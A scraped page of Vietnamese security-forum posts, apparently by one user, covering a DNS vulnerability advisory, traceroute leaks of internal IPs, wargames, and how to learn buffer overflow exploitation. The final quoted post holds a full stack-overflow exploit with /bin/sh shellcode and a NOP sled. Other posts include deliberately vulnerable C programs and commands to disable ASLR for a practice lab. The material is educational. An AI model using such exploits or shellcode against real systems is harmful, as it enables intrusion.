Theo thông tin từ VNCERT, Đội phản ứng nhanh về các sự cố máy tính VN, họ cũng đã có cung cấp thông tin cho các ISP từ vài tuần trước, nhưng không nhận được phản hồi. Theo tôi được biết, trong nay mai, sẽ có một thông cáo báo chí của VNCERT về vấn đề này, để yêu cầu sự hợp tác từ phía các ISP.<br/><br/> 4. Giải pháp tạm thời<br/><br/> Giải pháp tạm thời là không sử dụng Internet nữa, cho đến khi nào có thông tin mới. Haha tôi nói đùa đó <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">.<br/><br/> Giải pháp tạm thời là thay vì sử dụng máy chủ DNS của các ISP VN, các bạn hãy chuyển sang sử dụng máy chủ DNS của công ty OpenDNS. Các máy chủ của OpenDNS đã được vá lỗi và công ty này cũng cho biết họ đã sẵn sàng để phục vụ chúng ta.<br/><br/> Thông tin chi tiết về việc cấu hình máy tính sử dụng máy chủ DNS của OpenDNS, các bạn có thể xem ở đây. Nếu có khó khăn gì, cứ báo cho tôi biết, nếu tôi hỗ trợ được tôi sẽ hỗ trợ.<br/><br/> 5. Thông tin tham khảo<br/><br/><span class="link"> http://www.kb.cert.org/vuls/id/800113</span><br/><br/><span class="link"> http://isc.sans.org/diary.html?storyid=4687</span><br/><br/> Trước khi kết thúc, tôi muốn nhấn mạnh lại lần nữa đây là một lỗ hổng cực kỳ nghiêm trọng và ảnh hưởng trực tiếp đến mỗi người trong chúng ta.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23615.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23615/142761.html#142761,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tui vẫn chưa qua được level 11. Tài liệu dài quá, vẫn chưa đọc xong.<br/><br/> Bồ 4hfoo có cần giúp đỡ gì cho level 3 kô?<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23678.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23678/142760.html#142760,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">quanta wrote:</cite><br>
<blockquote><br/> - Nguyên nhân?<br/> - Chúng ta biết được gì từ output trên?<br/> - Chúng ta có thể kết luận gì?<br/> &nbsp;
</blockquote><br/><br/> - Đơn giản vì phía sau cái hop 203.162.95.46 là cái hop có IP address là 192.168.7.2. Cái host 203.162.95.46 có thể ở trong trạng thái multihomed, có 02 interface, một được assigned public IP là 203.162.95.46, còn một có thể assigned một private IP. Trong routing table của cái host 203.162.95.46, muốn reach được 203.162.168.130 thì phải đi qua một host có IP là 192.168.7.2.<br/><br/> Khi cái UDP packet hay ICMP Echo Request packet xuất phát từ host của bồ <b>secmask</b> đến được 192.168.7.2, TTL của nó bằng 0, nên cái host 192.168.7.2 mới gửi về một cái ICMP Time Exceeded, có destination address là address của <b>secmask</b>, nghĩa là đủ thông tin để routing rồi.<br/><br/> Khi packet này ra khỏi host 192.168.7.2, nó sẽ đến default gateway (hay cái gateway nào đó trong routing table của nó liên quan đến địa chỉ của <b>secmask</b>, tui đoán là default gateway, tự vì tui sử dụng mạng khác với <b>secmask</b> nhưng vẫn có kết quả tương tự). Khi đến default gateway của 192.168.7.2 (chúng ta không biết địa chỉ của thằng này, có thể không phải là 203.162.95.46), lẽ ra cái thằng layer 3 routing device tại đây phải thực hiện động tác SOURCE NAT, để thay cái địa chỉ của 192.168.7.2 bằng địa chỉ một trong các public interface của nó, rồi mới gửi đến next hop. Nhưng nó không làm việc này, và từ đây các hop về sau chỉ dùng thông tin dst IP (là IP của <b>secmask</b>) để routing mà thôi. Thực ra tui nghi ngờ là default, các layer 3 routing device sẽ không thực hiện SOURCE NAT cho ICMP Time Exceeded (và các loại ICMP replies khác), bởi lẽ đây là một packet không cần nhận được phản hồi từ phía người nhận.<br/><br/> Lưu ý ICMP là stateless, và các admin rất thường cho phép ICMP Time Exceeded đi vào hệ thống (để chi? để chạy được traceroute chứ chi :-p), nên packet này đến được host của secmask bình thường. Traceroute sẽ tách ra dst IP và src IP, rồi hiện ra như trên.<br/><br/> - Chúng ta có thể đoán được thế này:<br/><br/> * Host www.vnn.vn có thể nằm trong subnet 192.168.7.0/24.<br/><br/> - Chúng ta có thể kết luận:<br/><br/> * Nhớ thực hiện SOURCE NAT cho các loại ICMP replies, để tránh tiết lộ thông tin của internal network.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23615.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23615/142563.html#142563,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">He he mới đi chơi về, tối nay sẽ thử sức cái vortex 11. Cái này là về heap exploitation, tui cũng chưa đọc gì hết, tối nay sẽ thử đọc xem sao, hi vọng là sẽ giải quyết được. Thấy mấy cái level sau càng lúc càng hấp dẫn.<br/><br/> Bồ 4hfoo đến level bao nhiêu rồi?<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23615.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23615/142301.html#142301,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Mấy hôm nay tối nào tôi cũng chơi mấy cái wargame của đám PullThePlug ở http://www.overthewire.org/wargames.<br/><br/> Hiện tôi đang chơi Vortex, chuyên về software exploitation. Thằng Vortex này thì một số level khá đơn giản, chỉ cần kiến thức về *nix là giải quyết được, nhưng cũng có một số level đòi hỏi phải có kiến thức về software exploitation, bao gồm reverse engineering, cách khai thác các bug thông thường và viết shellcode. Tuy vậy nó không thực sự quá khó, nếu so sánh với các daemon ở các cuộc thi CTF thì có thể nói là dễ hơn nhiều (bởi vì không cần tìm bug, chỉ cần khai thác thôi, bug nó hiện rõ ra như ban ngày; việc khai thác cũng không bị quá nhiều ràng buộc).<br/><br/> Hôm qua đến giờ tôi đang bị kẹt ở một level của thằng Vortex mà lười đọc tài liệu nên chuyển qua chơi thằng Semtex, thấy cũng hấp dẫn lắm. Thằng Semtex thì thiên về programming hơn.<br/><br/> Bà con chơi thử, rồi cùng nhau bàn luận cách giải cho vui <img src="/hvaonline/images/smilies/068ae40523a24c9ef54edefd375e542d.gif" border="0" alt="smilie" align="absbottom">.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141654.html#141654,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">@xtinhcau: tôi nghĩ đọc sách những đề tài thế này, thường sẽ dẫn đến hai tình huống:<br/><br/> 1. tưởng là hiểu nhưng hóa ra không hiểu gì hết.<br/><br/> 2. tưởng là hiểu nhưng hóa ra chỉ là nhớ.<br/><br/> cả hai tình huống này đều dẫn đến một kết quả: làm không được.<br/><br/> Tôi nghĩ chỉ nên nghĩ là "đã hiểu" một khi có thể tự phân tích và tự giải quyết được những vấn đề tương tự nhưng <b>khác hoặc mới hơn</b> những vấn đề mà sách đưa ra.<br/><br/> Kiến thức mà mình tự gain được, bao giờ cũng bền chắc hơn rất nhiều kiến thức mà người khác nhồi vào đầu mình.<br/><br/> Nên người thầy mà dạy tốt, là người chỉ hướng dẫn, chứ không làm thay, rồi để học trò tự giải quyết vấn đề của họ. Sách thường kô làm được điều này, bởi lẽ nó không có tương tác giữa thầy và trò, dẫn đến việc sách nói một đường, trò hiểu một nẻo, nhưng sách không có cách nào để nhận ra là trò đang hiểu sai, để kịp thời điều chỉnh. Một vấn đề nữa là sách thường hay lan man, nói những thứ không cần thiết. Còn thầy thì, nhờ kinh nghiệm, biết rõ cái gì là cần thiết, cần phải tập trung vào đó.<br/><br/> Nói chung là nên tìm một ông thầy tốt như anh lamer :p.<br/><br/> --m<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23343.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23343/141585.html#141585,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">@vikjava: tôi nghĩ mới bắt đầu làm thì mới dễ để mà kiện toàn bảo mật đó bồ. Tôi nghĩ anh conmale và anh lamer đã cảnh báo khá đầy đủ rồi, nếu chỉ nghĩ security là vấn đề kĩ thuật, và giao cho một nhóm nhỏ làm networking phụ trách, thì sẽ sớm phá sản.<br/><br/> Tôi nghĩ việc trước tiên bồ cần phải làm, là tư vấn lại cho người đứng đầu về dự án này của bên bồ (nên là những người ở cấp C), muốn triển khai một dự án serious như e-banking, thì đòi hỏi phải có những người có kinh nghiệm. Nếu nội tại không có, thì phải thuê bên ngoài.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141584.html#141584,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">xtinhcau wrote:</cite><br>
<blockquote><br/> Xin chào các bạn, mình cũng mắc phải một vấn đề như vậy. Nghĩa là, mình đọc sách bắt đầu từ các ví dụ đơn giản và cố gắng hiểu cơ chế của nó. Mình nghĩ là cũng tương đối hiểu cơ chế đó, nhưng cứ đến khi chạy chương trình exploit lại không được như ý muốn. Vậy mình xin hỏi các bạn có kinh nghiệm<br/> - Tạo 1 "môi trường đơn giản" là như thế nào? (phải chăng phải dựng lại hệ thống với compiler + kernel cũ xưa)<br/> - Để có thể học đúng cách về BoF thì nên tiến hành các bước cụ thể thế nào? (B1: Thử với "môi trường đơn giản"; B2: Một số vấn đề với các hệ thống ngày nay,...?)<br/><br/> Cảm ơn các bạn.<br/> &nbsp;
</blockquote><br/><br/> Như đã nói ở trên, có hai yếu tố ảnh hưởng rất lớn đến việc tìm hiểu về các lỗi memory corruption là compiler và kernel. Nên suy nghĩ của bồ là chính xác. Tuy vậy, không cần phải dựng lại hệ thống, bồ chỉ cần cài đặt compiler cũ (cỡ gcc &lt; 4) và disable các tính năng *bảo vệ* của kernel là được.<br/><br/> Ví dụ như nếu bồ sử dung Ubuntu, thì chỉ cần làm những việc sau đây:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>$ sudo apt-get install gcc-3.3
$ sudo su -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"</pre>
</div><br/><br/> là bồ đã có được một môi trường đơn giản để chơi rồi.<br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141564.html#141564,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Thử sửa chương trình lại thế này<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>int main&#40;int argc, char *argv&#91;&#93;&#41;
{
char buffer&#91;500&#93;;
strcpy&#40;buffer, argv&#91;1&#93;&#41;;
printf&#40;argv&#91;3&#93;&#41;;
}</pre>
</div><br/><br/> Rồi chạy:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>$ ./vuln a</pre>
</div><br/><br/> Xem nó có in ra cái gì không? :p<br/><br/> Sau khi đã xơi em này, thử tiếp em này còn độc địa hơn:<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>int main&#40;int argc, char *argv&#91;&#93;&#41;
{
if &#40;argc&#41; exit&#40;0&#41;;
printf&#40;argv&#91;3&#93;&#41;;
exit&#40;0&#41;;
}</pre>
</div><br/><br/> --m<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23485.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23485/141471.html#141471,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Àh chê đơn giản àh, thế thì lên SourceForge.NET hoặc Google Code mà tìm. Có cả triệu phần mềm trên đó, thằng nào cũng có thể có lỗi. Có thể dùng http://www.koders.com/ để search.<br/><br/> Còn muốn *hấp dẫn hơn* thì lấy source code của những phần mềm popular như Firefox, Linux kernel về mà tìm.<br/><br/> Có một cách nữa là lên Milkw0rm hoặc CVE, dò tìm những exploit hay advisory có liên quan đến những phần mềm open source.<br/><br/> Phrack số mới nhất cũng có một bài phân tích lỗi của SAMBA WINS: http://www.phrack.org/issues.html?issue=65&id=12#article<br/><br/> --m<br/><br/><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141446.html#141446,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">lamer wrote:</cite><br>
<blockquote><br/> Vả lại "đoán" cũng chỉ là "đoán", không phải là "chỉ điểm".<br/><br/> Theo kinh nghiệm của mình thì đây thật sự là một cách học sai. Cách học đúng sẽ chỉ cho bạn cách "chỉ điểm". Từ đó mới bắt đầu phát triển lên để vượt rào ASLR này nọ.<br/> &nbsp;
</blockquote><br/><br/> Yeah yeah yeah! :d<br/><br/> Một vấn đề cần phải lưu ý là các tài liệu viết về buffer overflow đa số đều dựa trên các môi trường (compiler + kernel) cũ xưa, mà môi trường bây giờ thì đã thay đổi rất nhiều rồi (theo chiều hướng ngày càng khó khai thác). Nên đừng ngạc nhiên nếu tại sao đọc tài liệu rồi làm theo mà vẫn kô làm được.<br/><br/> Muốn học mấy cái này, như sư phụ lamer nói, thì phải có một môi trường thật đơn giản, để từ đó, mình có thể "chỉ tận tay, day tận mặt" cách chương trình bị khai thác, y như trong mấy cái tài liệu classic.<br/><br/> Một khi đã hiểu cái cốt lõi của vấn đề rồi, thì việc qua mặt mấy thằng như ASLR chủ yếu là dựa vào mẹo vặt mà thôi.<br/><br/> --m<br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141443.html#141443,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">Mr.Khoai wrote:</cite><br>
<blockquote><br/> Đó chính là câu hỏi của khoai. Khi mình không gọi nó (đặc biệt là khi vuln ở một remote host) thì mình dựa vào đâu để đoán ra return address? Như vậy không lẽ cùng một đoạn code khi run sẽ được đặt tại một vùng nhớ nhất định (đương nhiên là trên cùng OS)?<br/> &nbsp;
</blockquote><br/><br/> Muốn khai thác một chương trình nào đó, thì phải đạt được 2 điều kiện:<br/><br/> 1. đưa được dữ liệu vào: đưa vào cái gì, đưa khi nào và đưa bằng cách nào.<br/><br/> 2. quan sát được cách chương trình xử lý dữ liệu đưa vào: static analysis và/hay dynamic analysis.<br/><br/> Static analysis là dùng disassembler hay decompiler để phân tích mã nguồn của chương trình, và từ đó dự đoán cách thức chương trình sẽ xử lý dữ liệu đưa vào.<br/><br/> Dynamic analysis là dùng debugger, tracer, profiler để chạy chương trình và kiểm tra thực tế xem chương trình có thực thi đúng như những gì đã dự đoán khi làm static analysis kô.<br/><br/> Trong nhiều trường hợp, chỉ thực hiện được một trong hay cách phân tích này mà thôi, hoặc thậm chí, không thực hiện được cách phân tích nào (như ví dụ mà bồ đưa ra, chương trình vuln nằm ở remote host, chúng ta kô có source code cũng kô có binary để chạy thử), thì chúng ta phải dựa vào điều kiện thứ 2'.<br/><br/> 2'. quan sát được kết quả trả về của chương trình. Cái này giống như chosen-plaintext attack, ta nhập input, ta thấy được output, giờ nhiệm vụ là tìm hiểu cách thức chương trình xử lý, tìm lỗ hổng trong cách xử lý đó, rồi khai thác (khác chosen-plaintext attack ở chỗ, cái cần tìm kô phải là key, mà lại là algorithm).<br/><br/> Trong đa số trường hợp, ta có source code hoặc binary của chương trình muốn khai thác, việc còn lại là dựng lại một môi trường giống môi trường của target mà ta muốn khai thác (ví dụ như target chạy Windows XP Sp2, thì ta cũng phải có một môi trường giống y như vậy), rồi tiến hành phân tích, chạy thử trên môi trường nội bộ, sau khi đã thành công trên môi trường nội bộ rồi, thì mới tiến hành khai thác target.<br/><br/> Trong những trường hợp ta không có source code hoặc binary của chương trình muốn khai thác, mà chỉ được quyền nhập input và quan sát output, thì tùy trường hợp mà có khai thác được hay không.<br/><br/> <p></p>
<cite class="blockquote">Mr.Khoai wrote:</cite><br>
<blockquote><br/> Câu này tương tự như câu đầu tiên, gamma hay ai có tài liệu về memory management trên linux thì xin send cho khoai.<br/> &nbsp;
</blockquote><br/><br/> Tài liệu về vấn đề này chủ yếu là cách làm việc của loader trong Linux và cấu trúc của file ELF. Bồ có thể bắt đầu bằng<span class="link"> http://en.wikipedia.org/wiki/Executable_and_Linkable_Format.</span><br/><br/> --m</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/20243.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/20243/141439.html#141439,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">Mr.Khoai wrote:</cite><br>
<blockquote>Giả sử ta có một chương trình như sau:<span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>/*
* vuln.c
*/
int main&#40;int argc, char *argv&#91;&#93;&#41;
{
char buffer&#91;500&#93;;
strcpy&#40;buffer, argv&#91;1&#93;&#41;;
return 0;
}</pre>
</div><br/> Và kiểm tra thử:<span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>$ gcc -o vuln vuln.c
...
$ ./vuln
Segmentation fault
$ ./vuln test
$ ./vuln `perl -e 'print "A"x600;'`
Segmentation fault</pre>
</div><br/> Sau đó, ta có thêm một đoạn code exploit.c như sau:<span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
char shellcode&#91;&#93;=
"\x6a\x0b" // push $0xb
"\x58" // pop %eax
"\x99" // cltd
"\x52" // push %edx
"\x68\x2f\x2f\x73\x68" // push $0x68732f2f
"\x68\x2f\x62\x69\x6e" // push $0x6e69622f
"\x89\xe3" // mov %esp,%ebx
"\x52" // push %edx
"\x53" // push %ebx
"\x89\xe1" // mov %esp,%ecx
"\xcd\x80"; // int $0x80
unsigned long sp&#40;&#41; {
__asm__&#40;"movl %esp, %eax"&#41;;}
int main &#40;int argc, char *argv&#91;&#93;&#41; {
int i, offset;
long esp, ret, *addr_ptr;
char *buf, *ptr;
offset = 0 ; // Cụ thể cho cái vuln này
esp = sp&#40;&#41;;
ret = esp - offset;
printf &#40;"ESP : 0x%x\n", esp&#41;;
printf &#40;"offset : 0x%x\n", offset&#41;;
printf &#40;"RetAddr: 0x%x\n", ret&#41;;
buf = malloc&#40;600&#41;;
ptr = buf;
addr_ptr = &#40;long *&#41;ptr;
/* Initialize cái return address */
for &#40;i=0; i&lt;600; i+=4&#41;
*&#40;addr_ptr++&#41; = ret;
/* NOP sled */
for &#40;i=0; i&lt;202; i++&#41;
buf&#91;i&#93; = '\x90';
/* Bỏ đám shellcode vô đây */
ptr = buf + 202;
for &#40;i=0; i &lt; strlen&#40;shellcode&#41;; i++&#41;
*&#40;ptr++&#41; = shellcode&#91;i&#93;;
buf&#91;600-1&#93; = 0;
execl&#40;"./vuln", "./vuln", buf, 0&#41;;
//vuln&#40;buf&#41;;
return &#40;0&#41;;
}</pre>
</div><br/> <font color='orange'>Câu hỏi</font><br/><br/> 1. Ở vuln, khi run mà không có tham số nào cả thì vì sao bị seg fault? đáng lẽ ra strcpy sẽ không copy gì cả mới đúng chứ? Hay là argv[1] tự động trỏ tới phần memory trên stack, và phần này vô tình nullify nhiều hơn 500 bytes nên mới có tình trạng seg fault?<br/><br/> 2. exploit dùng chính ESP để đoán address cho NOP sled. Nhưng, khi exploit gọi execl, execl sẽ fork vuln, và vuln sẽ có stack riêng, vậy kỹ thuật này đâu đoán đúng địa chỉ của NOP sled?<br/><br/> 3. Theo "Art of Exploitaion" edition 1, đoạn exploit trên khi run sẽ trả về một shell. Khoai có thay đoạn shellcode (cũng là exec /bin/sh) nhưng khi run exploit thì chỉ nhận được:<span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>ESP : 0xbfa7c608
offset : 0x0
RetAddr: 0xbfa7c608
Segmentation fault</pre>
</div>Có phải đây là do việc đoán address bị sai? Khoai đã thử tạo một hàm vuln, và thay vì execl thì khoai cho chính exploit gọi vuln, và điều chỉnh lại offset cho đúng với ESP của vuln, nhưng vẫn không spawn shell được mà chỉ bị seg fault. Lỗi là ở đâu?<br/><br/> 4. Ngoài cách dùng ESP để đoán address thì có cách nào khác? Ví dụ khi exploit một client server application thì chương trình exploit đâu có gọi được chương trình bị bof? Vậy càng không thể đoán address dựa trên ESP?<br/><br/> Cám ơn bà con đã đọc.<br/> khoai&nbsp;
